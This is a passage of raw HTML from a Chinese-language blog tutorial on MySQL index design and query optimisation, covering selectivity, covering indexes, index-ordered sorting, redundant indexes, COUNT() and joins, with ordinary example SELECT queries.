data-line=\"crayon-5b4aa14398cfa259757501-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cfa259757501-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cfa259757501-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398cfa259757501-1\"><span class=\"crayon-e\">select </span><span class=\"crayon-v\">film_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">actor_id </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">film_actor </span><span class=\"crayon-e\">where </span><span class=\"crayon-v\">actor_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cfa259757501-2\"><span class=\"crayon-e\">union </span><span class=\"crayon-e\">all </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398cfa259757501-3\"><span class=\"crayon-e\">select </span><span class=\"crayon-v\">film_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">actor_id </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">film_actor </span><span class=\"crayon-e\">where </span><span class=\"crayon-v\">film_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">actor_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cfa259757501-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p></p>\n<ul>\n<li>当出现多个索引做相交操作时（多个AND条件），通常来说一个包含所有相关列的索引要优于多个独立索引。</li>\n<li>当出现多个索引做联合操作时（多个OR条件），对结果集的合并、排序等操作需要耗费大量的CPU和内存资源，特别是当其中的某些索引的选择性不高，需要返回合并大量数据时，查询成本更高。所以这种情况下还不如走全表扫描。</li>\n</ul>\n<p>因此<code>explain</code>时如果发现有索引合并（Extra字段出现<code>Using union</code>），应该好好检查一下查询和表结构是不是已经是最优的，如果查询和表都没有问题，那只能说明索引建的非常糟糕，应当慎重考虑索引是否合适，有可能一个包含所有相关列的多列索引更适合。</p>\n<p>前面我们提到过索引如何组织数据存储的，从图中可以看到多列索引时，索引的顺序对于查询是至关重要的，很明显应该把选择性更高的字段放到索引的前面，这样通过第一个字段就可以过滤掉大多数不符合条件的数据。</p>\n<blockquote><p><strong>索引选择性</strong>是指不重复的索引值和数据表的总记录数的比值，选择性越高查询效率越高，因为选择性越高的索引可以让MySQL在查询时过滤掉更多的行。唯一索引的选择性是1，这是最好的索引选择性，性能也是最好的。</p></blockquote>\n<p>理解索引选择性的概念后，就不难确定哪个字段的选择性较高了，查一下就知道了，比如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398cfe758152814\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT * FROM payment where staff_id = 2 and customer_id = 584\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cfe758152814-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cfe758152814-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398cfe758152814-1\"><span class=\"crayon-e \">SELECT *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">payment </span><span class=\"crayon-e\">where </span><span class=\"crayon-v\">staff_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">customer_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">584</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cfe758152814-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>是应该创建<code>(staff_id,customer_id)</code>的索引还是应该颠倒一下顺序？执行下面的查询，哪个字段的选择性更接近1就把哪个字段索引前面就好。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398d04124786026\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect count(distinct staff_id)/count(*) as staff_id_selectivity,\r\n       count(distinct customer_id)/count(*) as customer_id_selectivity,\r\n       count(*) from payment\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d04124786026-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d04124786026-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d04124786026-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d04124786026-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398d04124786026-1\"><span class=\"crayon-e\">select </span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">distinct </span><span class=\"crayon-v\">staff_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">staff_id_selectivity</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d04124786026-2\"><span class=\"crayon-h\">       </span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">distinct </span><span class=\"crayon-v\">customer_id</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">as</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">customer_id_selectivity</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d04124786026-3\"><span class=\"crayon-h\">       </span><span class=\"crayon-e\">count</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-i\">payment</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d04124786026-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>多数情况下使用这个原则没有任何问题，但仍然注意你的数据中是否存在一些特殊情况。举个简单的例子，比如要查询某个用户组下有过交易的用户信息：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398d07754328281\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect user_id from trade where user_group_id = 1 and trade_amount &gt; 0\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d07754328281-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d07754328281-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398d07754328281-1\"><span class=\"crayon-e\">select </span><span class=\"crayon-e\">user_id </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">trade </span><span class=\"crayon-e\">where </span><span class=\"crayon-v\">user_group_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trade_amount</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d07754328281-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>MySQL为这个查询选择了索引<code>(user_group_id,trade_amount)</code>，如果不考虑特殊情况，这看起来没有任何问题，但实际情况是这张表的大多数数据都是从老系统中迁移过来的，由于新老系统的数据不兼容，所以就给老系统迁移过来的数据赋予了一个默认的用户组。这种情况下，通过索引扫描的行数跟全表扫描基本没什么区别，索引也就起不到任何作用。</p>\n<p>推广开来说，经验法则和推论在多数情况下是有用的，可以指导我们开发和设计，但实际情况往往会更复杂，实际业务场景下的某些特殊情况可能会摧毁你的整个设计。</p>\n<h6>4、避免多个范围条件</h6>\n<p>实际开发中，我们会经常使用多个范围条件，比如想查询某个时间段内登录过的用户：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398d0b941584025\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect user.* from user where login_time &gt; '2017-04-01' and age between 18 and 30;\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d0b941584025-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d0b941584025-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398d0b941584025-1\"><span class=\"crayon-e\">select </span><span class=\"crayon-v\">user</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">user </span><span class=\"crayon-e\">where </span><span class=\"crayon-v\">login_time</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'2017-04-01'</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">age </span><span class=\"crayon-i\">between</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d0b941584025-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>这个查询有一个问题：它有两个范围条件，login_time列和age列，MySQL可以使用login_time列的索引或者age列的索引，但无法同时使用它们。</p>\n<h6>5、覆盖索引</h6>\n<p>如果一个索引包含或者说覆盖所有需要查询的字段的值，那么就没有必要再回表查询，这就称为覆盖索引。覆盖索引是非常有用的工具，可以极大的提高性能，因为查询只需要扫描索引会带来许多好处：</p>\n<ul>\n<li>索引条目远小于数据行大小，如果只读取索引，极大减少数据访问量</li>\n<li>索引是有按照列值顺序存储的，对于I/O密集型的范围查询要比随机从磁盘读取每一行数据的IO要少的多</li>\n</ul>\n<h6>6、使用索引扫描来排序</h6>\n<p>MySQL有两种方式可以生产有序的结果集，其一是对结果集进行排序的操作，其二是按照索引顺序扫描得出的结果自然是有序的。如果explain的结果中<code>type</code>列的值为<code>index</code>表示使用了索引扫描来做排序。</p>\n<p>扫描索引本身很快，因为只需要从一条索引记录移动到相邻的下一条记录。但如果索引本身不能覆盖所有需要查询的列，那么就不得不每扫描一条索引记录就回表查询一次对应的行。这个读取操作基本上是随机I/O，因此按照索引顺序读取数据的速度通常要比顺序地全表扫描要慢。</p>\n<p>在设计索引时，如果一个索引既能够满足排序，又满足查询，是最好的。</p>\n<p>只有当索引的列顺序和<code>ORDER BY</code>子句的顺序完全一致，并且所有列的排序方向也一样时，才能够使用索引来对结果做排序。如果查询需要关联多张表，则只有<code>ORDER BY</code>子句引用的字段全部为第一张表时，才能使用索引做排序。<code>ORDER BY</code>子句和查询的限制是一样的，都要满足最左前缀的要求（有一种情况例外，就是最左的列被指定为常数，下面是一个简单的示例），其他情况下都需要执行排序操作，而无法利用索引排序。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398d0f967017106\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 最左列为常数，索引：(date,staff_id,customer_id)\r\nselect  staff_id,customer_id from demo where date = '2015-06-01' order by staff_id,customer_id\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d0f967017106-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398d0f967017106-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398d0f967017106-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398d0f967017106-1\"><span class=\"crayon-c\">// 最左列为常数，索引：(date,staff_id,customer_id)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398d0f967017106-2\"><span class=\"crayon-e\">select  </span><span class=\"crayon-v\">staff_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">customer_id </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">demo </span><span class=\"crayon-e\">where </span><span class=\"crayon-v\">date</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'2015-06-01'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">order </span><span class=\"crayon-e\">by </span><span class=\"crayon-v\">staff_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">customer</span><span class=\"crayon-sy\">_</span>id</div><div class=\"crayon-line\" id=\"crayon-5b4aa14398d0f967017106-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>\n</p></blockquote>\n<h6>7、冗余和重复索引</h6>\n<p>冗余索引是指在相同的列上按照相同的顺序创建的相同类型的索引，应当尽量避免这种索引，发现后立即删除。比如有一个索引<code>(A,B)</code>，再创建索引<code>(A)</code>就是冗余索引。冗余索引经常发生在为表添加新索引时，比如有人新建了索引<code>(A,B)</code>，但这个索引不是扩展已有的索引<code>(A)</code>。</p>\n<p>大多数情况下都应该尽量扩展已有的索引而不是创建新索引。但有极少情况下出现性能方面的考虑需要冗余索引，比如扩展已有索引而导致其变得过大，从而影响到其他使用该索引的查询。</p>\n<h6>8、删除长期未使用的索引</h6>\n<p>定期删除一些长时间未使用过的索引是一个非常好的习惯。</p>\n<p>关于索引这个话题打算就此打住，最后要说一句，索引并不总是最好的工具，只有当索引帮助提高查询速度带来的好处大于其带来的额外工作时，索引才是有效的。对于非常小的表，简单的全表扫描更高效。对于中到大型的表，索引就非常有效。对于超大型的表，建立和维护索引的代价随之增长，这时候其他技术也许更有效，比如分区表。最后的最后，<strong><code>explain</code>后再提测是一种美德</strong>。</p>\n<h4>特定类型查询优化</h4>\n<h5>优化COUNT()查询</h5>\n<p><code>COUNT()</code>可能是被大家误解最多的函数了，它有两种不同的作用，其一是统计某个列值的数量，其二是统计行数。统计列值时，要求列值是非空的，它不会统计NULL。如果确认括号中的表达式不可能为空时，实际上就是在统计行数。最简单的就是当使用<code>COUNT(*)</code>时，并不是我们所想象的那样扩展成所有的列，实际上，它会忽略所有的列而直接统计行数。</p>\n<p>我们最常见的误解也就在这儿，在括号内指定了一列却希望统计结果是行数，而且还常常误以为前者的性能会更好。但实际并非这样，如果要统计行数，直接使用<code>COUNT(*)</code>，意义清晰，且性能更好。</p>\n<p>有时候某些业务场景并不需要完全精确的<code>COUNT</code>值，可以用近似值来代替，EXPLAIN出来的行数就是一个不错的近似值，而且执行EXPLAIN并不需要真正地去执行查询，所以成本非常低。通常来说，执行<code>COUNT()</code>都需要扫描大量的行才能获取到精确的数据，因此很难优化，MySQL层面还能做得也就只有覆盖索引了。如果不还能解决问题，只有从架构层面解决了，比如添加汇总表，或者使用redis这样的外部缓存系统。</p>\n<h5>优化关联查询</h5>\n<p>在大数据场景下，表与表之间通过一个冗余字段来关联，要比直接使用<code>JOIN</code>有更好的性能。如果确实需要使用关联查询的情况下，需要特别注意的是：</p>\n<ul>\n<li>确保<code>ON</code>和<code>USING</code>字句中的列上有索引。在创建索引的时候就要考虑到关联的顺序。当表A和表B用列c关联的时候，如果优化器关联的顺序是A、B，那么就不需要在A表的对应列上创建索引。没有用到的索引会带来额外的负担，一般来说，除非有其他理由，只需要在关联顺序中的第二张表的相应列上创建索引（具体原因下文分析）。</li>\n<li>确保任何的<code>GROUP BY</code>和<code>ORDER BY</code>中的表达式只涉及到一个表中的列，这样MySQL才有可能使用索引来优化。</li>\n</ul>\n<p>要理解优化关联查询的第一个技巧，就需要理解MySQL是如何执行关联查询的。当前MySQL关联执行的策略非常简单，它对任何的关联都执行<strong>嵌套循环关联</strong>操作，即先在一个表中循环取出单条数据，然后在嵌套循环到下一个表中寻找匹配的行，依次下去，直到找到所有表中匹配的行为为止。然后根据各个表匹配的行，返回查询中需要的各个列。</p>\n<p>太抽象了？以上面的示例来说明，比如有这样的一个查询：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398d18747122052\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div 